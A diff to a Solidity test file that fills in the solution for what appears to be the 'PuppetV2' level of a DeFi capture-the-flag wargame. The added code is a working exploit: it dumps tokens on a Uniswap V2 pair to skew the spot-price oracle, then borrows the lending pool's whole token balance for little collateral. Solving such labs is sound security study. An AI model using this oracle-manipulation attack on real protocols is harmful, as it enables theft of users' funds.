@@ -34,6 +34,7 @@ contract PuppetV2 is Test {
     PuppetV2Pool internal puppetV2Pool;
     address payable internal attacker;
     address payable internal deployer;
+    address[] add;
 
     function setUp() public {
         /**
@@ -95,13 +96,14 @@ contract PuppetV2 is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
-
-        /**
-         * EXPLOIT END *
-         */
+        add = [address(dvt), address(weth)];
+        vm.startPrank(attacker);
+        weth.deposit{value: attacker.balance}();
+        dvt.approve(address(uniswapV2Router), dvt.balanceOf(attacker));
+        uniswapV2Router.swapExactTokensForTokens(dvt.balanceOf(attacker), 0, add, attacker, block.timestamp);
+        weth.approve(address(puppetV2Pool), weth.balanceOf(attacker));
+        puppetV2Pool.borrow(dvt.balanceOf(address(puppetV2Pool)));
+        vm.stopPrank();
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
